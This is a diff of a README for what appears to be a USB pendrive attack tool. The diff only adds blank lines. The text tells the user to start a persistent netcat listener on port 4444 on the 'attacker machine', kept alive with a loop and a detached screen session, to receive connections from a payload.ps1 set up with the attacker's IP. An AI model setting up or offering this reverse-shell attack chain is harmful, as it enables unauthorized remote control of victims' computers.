@@ -13,10 +13,14 @@ Step 1: git clone this repo onto your pendrive which is without any subfolders
 
 Step 2: start the listner on your host (attacker machine)
 >while true; do nc -l -p 4444; done
+
 this will start listening on port 4444 which we'll specify in our payload.ps1 file along with the attackers IP address, this is a simple while loop which will keep our listner alive by executing it in loop
 you can even start a screen session that way our listner will always be active even if we close our terminal
+
 >screen -dmS netcat_listener bash -c 'while true; do nc -lp 4444; done'
+
 you can view your running screen sessions with 
+
 >screen -list
 There is a screen on:
 	22794.netcat_listener 	(11/01/2016 03:36:01 PM)	(Detached)
